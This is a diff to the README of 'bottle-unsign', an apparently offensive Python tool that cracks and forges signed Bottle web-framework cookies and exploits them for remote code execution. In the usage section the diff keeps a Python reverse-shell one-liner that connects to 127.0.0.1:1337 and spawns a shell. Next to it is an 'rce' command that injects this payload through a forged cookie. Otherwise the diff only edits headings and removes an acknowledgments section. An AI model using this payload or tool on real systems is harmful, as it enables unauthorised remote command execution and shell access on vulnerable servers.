@@ -18,7 +18,7 @@ bottle-unsign is a Python tool for encoding, decoding, and performing dictionary
    cd bottle-unsign
    ```
 
-2. **Install dependencies:**
+2. **Install:**
 
    ```bash
    pip3 install .
@@ -60,15 +60,10 @@ bottle-unsign dict-attack --cookie '!wzE3YvpBN2Fixls6im4tdw==?gAWVFwAAAAAAAACMBG
 ```bash
 PAYLOAD='python3 -c "import os,pty,socket;s=socket.socket();s.connect((\"127.0.0.1\",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")"'
 
-bottle-unsign rce --cookie "('name', {'name': RCE()})" --key your_secret --cmd $PAYLOAD [--url] [--cookie-name]
+bottle-unsign rce --cookie "('name', {'name': 'RCE()'})" --key your_secret --cmd $PAYLOAD [--url]
 ```
 
 
 ## Contributing
 
 Contributions are welcome! Please fork the repository and submit a pull request with your improvements.
-
-
-## Acknowledgments
-
-- This tool utilizes the `rich` library for colorful and interactive terminal output.
